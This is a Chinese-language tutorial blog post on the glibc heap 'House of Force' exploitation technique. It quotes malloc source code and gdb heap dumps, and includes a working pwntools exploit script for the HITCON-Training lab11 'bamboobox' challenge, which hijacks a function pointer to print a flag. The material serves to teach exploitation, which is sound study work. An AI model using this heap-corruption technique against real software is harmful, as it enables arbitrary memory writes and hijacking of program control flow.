---
title: Linux glibc heap house-of-force
date: 2018-04-19 23:10:45
tags: [heap,house-of-force]
categories: Exploit
keywords: [heap,house-of-force]
---

该利用方法通过堆溢出漏洞修改 top chunk 的 size 字段，使得 malloc 一块很大的内存可使用 top chunk 进行分配，当更新 top chunk 的 ptr 时会发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将从目标内存处进行分配，之后对该内存进行写操作，即可实现任意地址写数据。

# 0x01 TOP Chunk
堆内存是从低地址向高地址进行分配的，在堆内存的最高处存在着一块空闲 chunk 称为 top chunk。使用 malloc 分配内存时，若 bins 和 fast bins 中的 chunk 都不能满足分配需要则在 top chunk 中分出一块内存给用户。

top chunk 的大小跟随内存的分配和回收不停变换，如果从 top chunk 分配内存会导致 top chunk 减小，同时 top chunk 的指针增大；如果回收的 chunk 恰好与 top chunk 相邻，那么回收的 chunk 就会合并到 top chunk 中，从而使 top chunk 变大，top chunk 的指针减小。

glibc 中从 top chunk 分配内存的代码如下，首先会检查 top chunk 的大小是否能满足分配需求，同时还要确保分配完后剩余的大小不能小于最小 chunk 大小（MINSIZE），若满足该条件则进行分配。分配内存后需更新 top chunk 的 size 字段为 size - nb（nb 为新分配 chunk 的大小），top chunk ptr 更新为 ptr + nb。
```c++
/* malloc.c in glibc-2.23 */
/* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

/* check that one of the above allocation paths succeeded */
/* 若top chunk分割后，剩余的大小仍不小于最小chunk大小（MINSIZE），则进行分配。*/
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
  {
      remainder_size = size - nb;   // 更新top chunk的size
      remainder = chunk_at_offset (p, nb);   // 更新top chunk的ptr
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);   // 返回新分配的内存地址
}

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

/* conversion from malloc headers to user pointers, and back */
#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
```

下面以一个例子说明该过程，堆内存初始状态如下，top chunk 的大小为 0x20fe0，ptr为 0x603020，并且 bins 中没有空闲的 chunk。    
```sh
gdb-peda$ heapls
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x20            (inuse)
chunk      0x603020         0x20fe0         (top)
sbrk_end   0x624000
```
此时使用 malloc(0x45) 申请一个新 chunk，将会在 top chunk 中分配内存给该 chunk。新分配 chunk ptr 为 0x603020，即原 top chunk 的 ptr，大小为 0x50 = align(0x45 + 0x8)，其中 0x8 为 size 字段长度，对齐单位为 16 字节（32 bit 系统中为 8 字节）；分配完后，top chunk 的 size 为 0x20f90 = 0x20fe0-0x50，ptr 为 0x603070 = 0x603020+0x50；最后返回给用户的内存为 0x603030 = 0x603020+2*0x8。
```sh
gdb-peda$ heapls
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x20            (inuse)
chunk      0x603020         0x50            (inuse)
chunk      0x603070         0x20f90         (top)
sbrk_end   0x624000
gdb-peda$ info reg rax
rax            0x603030 0x603030
```

# 0x02 利用方法
在 top chunk 中分配一块很大的内存给新申请的 chunk，使得更新 top chunk 的 ptr 时发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将返回目标内存地址，之后对该内存进行写操作，即可实现任意地址写数据。    

## 1. 修改 top chunk 的 size 为大数
从上面的分析可知，在 top chunk 中分配内存需要满足以下条件。
```c++
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
由于 arena 的大小为 132KB，所以 top chunk 的 size 不大于 132KB（0x21000 bytes），因此在正常情况下通过 top chunk 分配的堆不能超过 0x21000 bytes，这导致无法在更新 top chunk 的 ptr 时发生整数溢出。为此，需要先利用堆溢出漏洞修改 top chunk 的 size 为一个大数，通常取 -1（其补码为 0xFFFFFFFFFFFFFFFF），之后便可通过 top chunk 申请一块很大的内存以触发整数溢出。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-19/51587433.jpg)     

## 2. malloc 一块大内存，控制 top chunk ptr
假设该步骤中申请内存时用户请求大小为 request_size；最终需控制的内存地址为 target；top chunk 的 ptr 初始值为 top_old，分配新 chunk 后的 ptr 为 top_new；由上一节中的分析可得到以下等式，其中 SIZE_SZ 在 64 bits 系统中为 8 bytes，32 bits 系统中为 4 bytes。
```c++
top_new = top_old + align(request_size+ SIZE_SZ)  // SIZE_SZ为size字段长度
target = top_new + 2* SIZE_SZ  // 2* SIZE_SZ为prev_size和size字段长度
```
根据上式可得
```c++
 request_size  = target - top_old - 2*SIZE_SZ - SIZE_SZ
```
 需要注意的是 request_size+SIZE_SZ 要遵循块的对齐机制，如果未对齐应进行调整，将 request_size 的计算结果减去一个值（因为对齐时会增大长度使其对齐），使 request_size+SIZE_SZ 能对齐。

malloc 执行完后 top chunk ptr 将会更新，并指向目标内存 target-2* SIZE_SZ 处，即 top chunk 已转移到目标内存地址。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-19/65486405.jpg)    
__由于计算 request_size 的大小需要知道堆内存中 top_old 的 ptr，所以得借助其他漏洞泄漏堆中 top chunk 的地址。或者可以将 target 指定在堆内存区域，那么通过本地调试可获得 top chunk 的地址，此时使用上式计算所得 request_size 相当于相对地址偏移，当堆基址改变后该值仍适用。__

## 3. 再次 malloc，返回目标内存
此时申请 chunk 将从目标内存处分配，最终成功返回目标内存 target，之后可对该内存写数据，以实现进一步的攻击。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-19/46291433.jpg)    

# 0x03 实例分析
下面以 [HITCON-Training](https://github.com/scwuaptx/HITCON-Training) 中的 lab11 为例说明 house of force 的利用过程，题目文件和利用脚本也可在 [Github](https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-force) 中下载。

## 1. 漏洞
程序中在修改 item 时调用 change_item() 函数，name 的长度由用户指定，并且没有进行检查。输入过长字符串到 name 中将会导致堆溢出，可覆盖 top chunk。
```c++
void change_item(){
    ...
    if(itemlist[index].name){
        printf("Please enter the length of item name:");
        read(0,lengthbuf,8);
        length = atoi(lengthbuf);
        printf("Please enter the new name of the item:");
        readsize = read(0,itemlist[index].name,length);   // overflow
        *(itemlist[index].name + readsize) = '\x00';
    }
    ...
```

## 2. 利用脚本
### 1）利用思路
利用 house of force 使得 top chunk 转移到 box 结构体所在内存处，使得下次申请内存时从该地址开始进行分配，控制该内存块后可修改 box 结构体中的函数指针为 magic 函数地址；最后调用 goobye_message 函数时就跳转到 magic 函数执行，从而输出 flag。

### 2）利用脚本
利用脚本如下：
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
r = process('./bamboobox')

def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("name:")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
raw_input("malloc item0")
additem(0x40,"AAAA")

#raw_input("modify item0,overite size of top chunk")
modify(0,0x50,"a"*0x40 + p64(0) + p64(0xffffffffffffffff))

#raw_input("add a large chunk,control top chunk")
additem(0x603010 - 0x603070 - 2*8 - 8,"BBBB")

#raw_input("return target,overwrite function ptr")
additem(0x20,p64(magic)*2)

#raw_input("exit")
r.sendline('5')
r.recvuntil("Your choice:")
print r.recvuntil("}")
```

## 3. 利用过程
### 1) 添加 item0
添加item0后，堆内存分布如下，0x63000 处的 chunk0 为 box 结构体，结构体中包含 2 个函数指针。0x603020 处的 chunk1 为刚申请用于存放 name 的空间，并且 chunk1 与 top chunk 相邻。    
```c++
struct box{
    void (*hello_message)();
    void (*goodbye_message)();
};
```

```sh
gdb-peda$ heapls
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x20            (inuse)
chunk      0x603020         0x50            (inuse)
chunk      0x603070         0x20f90         (top)
sbrk_end   0x624000
gdb-peda$ x/20x 0x603000
0x603000:       0x0000000000000000      0x0000000000000021
0x603010:       0x0000000000400896      0x00000000004008b1
0x603020:       0x0000000000000000      0x0000000000000051
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000020f91
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
```

### 2) 溢出 name
由于 change_item() 函数中 name 的长度由用户指定，并且程序没有对长度做限制，当指定修改的 name 长度大于 name 的内存大小时，将会导致越界写内存，从而可修改 top chunk 的 size 字段为-1。
```sh
gdb-peda$ heapls
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x20            (inuse)
chunk      0x603020         0x50            (inuse)
chunk      0x603070         0xfffffffffffffff8(top)
sbrk_end   0x624000
gdb-peda$ x/20x 0x603000
0x603000:       0x0000000000000000      0x0000000000000021
0x603010:       0x0000000000400896      0x00000000004008b1
0x603020:       0x0000000000000000      0x0000000000000051
0x603030:       0x6161616161616161      0x6161616161616161
0x603040:       0x6161616161616161      0x6161616161616161
0x603050:       0x6161616161616161      0x6161616161616161
0x603060:       0x6161616161616161      0x6161616161616161
0x603070:       0x0000000000000000      0xffffffffffffffff
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
```

### 3) 添加 item1
程序调用 malloc 在 top chunk 中分配一块大内存给 name ，此时更新 top chunk ptr 将会触发整数溢出，从而控制 top chunk 转移到指定内存。
```sh
gdb-peda$ heapls
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x68            (top)
sbrk_end   0x624000
gdb-peda$ x/20x 0x603000
0x603000:       0x0000000000000000      0x0000000000000069
0x603010:       0x0000000000400896      0x00000000004008b1
0x603020:       0x0000000000000000      0x0000000000000051
0x603030:       0x6161616161616161      0x6161616161616161
0x603040:       0x6161616161616161      0x6161616161616161
0x603050:       0x6161616161616161      0x6161616161616161
0x603060:       0x6161616161616161      0x6161616161616161
0x603070:       0x0000000000000000      0xffffffffffffff91
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
```

### 4) 再次添加 item2
malloc(0x20) 从新的 top chunk 中分配一块内存给 item 的 name，rax 中返回的起始地址为 0x603010，该内存块会包含 box 结构体所在的 chunk。
```sh
gdb-peda$ heapls                                                                           
           ADDR             SIZE            STATUS
sbrk_base  0x603000
chunk      0x603000         0x30            (inuse)
chunk      0x603030         0x38            (top)
sbrk_end   0x624000
gdb-peda$ info reg rax
rax            0x603010 0x603010
gdb-peda$ x/20x 0x603000                                                                   
0x603000:       0x0000000000000000      0x0000000000000031
0x603010:       0x0000000000400896      0x00000000004008b1
0x603020:       0x0000000000000000      0x0000000000000051
0x603030:       0x6161616161616161      0x0000000000000039
0x603040:       0x6161616161616161      0x6161616161616161
0x603050:       0x6161616161616161      0x6161616161616161
0x603060:       0x6161616161616161      0x6161616161616161
0x603070:       0x0000000000000000      0x00ffffffffffff91
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
```
之后将 magic 函数地址作为 item2 的 name 写入到新分配的 chunk 中，覆盖 box 结构体中的函数指针，进行劫持程序执行流程。
```sh
gdb-peda$ x/20x 0x603000                                                        
0x603000:       0x0000000000000000      0x0000000000000031
0x603010:       0x0000000000400d49      0x0000000000400d49
0x603020:       0x000000000000000a      0x0000000000000051
0x603030:       0x6161616161616161      0x0000000000000039
0x603040:       0x6161616161616161      0x6161616161616161
0x603050:       0x6161616161616161      0x6161616161616161
0x603060:       0x6161616161616161      0x6161616161616161
0x603070:       0x0000000000000000      0x00ffffffffffff91
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
gdb-peda$ telescope 0x400d49
0000| 0x400d49 (<magic>:        push   rbp)
0008| 0x400d51 (<magic+8>:      mov    rax,QWORD PTR fs:0x28)
0016| 0x400d59 (<magic+16>:     add    BYTE PTR [rax-0x77],cl)
0024| 0x400d61 (<magic+24>:     add    BYTE PTR [rax],al)
0032| 0x400d69 (<magic+32>:     add    BYTE PTR [rax+0x0],bh)
0040| 0x400d71 (<magic+40>:     stc)
0048| 0x400d79 (<magic+48>:     rex.WRB xchg r8,rax)
0056| 0x400d81 (<magic+56>:     add    BYTE PTR [rax],al)
```

### 5) 退出程序
退出程序时会调用 goodbye_message 函数，从而执行 magic 输出 flag。
```sh
[DEBUG] Sent 0x2 bytes:
    '5\n'
[DEBUG] Received 0xe0 bytes:
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Received 0x13 bytes:
    'flag{this_is_flag}\n'
flag{this_is_flag}
```

---

References:   
[1] [The Malloc Maleficarum Glibc Malloc Exploitation Techniques](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)     
[2] [House of Force](https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html)    
[3] [WhyNot-HEAP-Exploitation](https://github.com/shinmao/WhyNot-HEAP-Exploitation/tree/master/House-Of-Force)   
[4] [CTF Wiki-house of force](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_force/)   
[5] [HITCON-training writeup](http://veritas501.space/2017/05/23/HITCON-training%20writeup/)
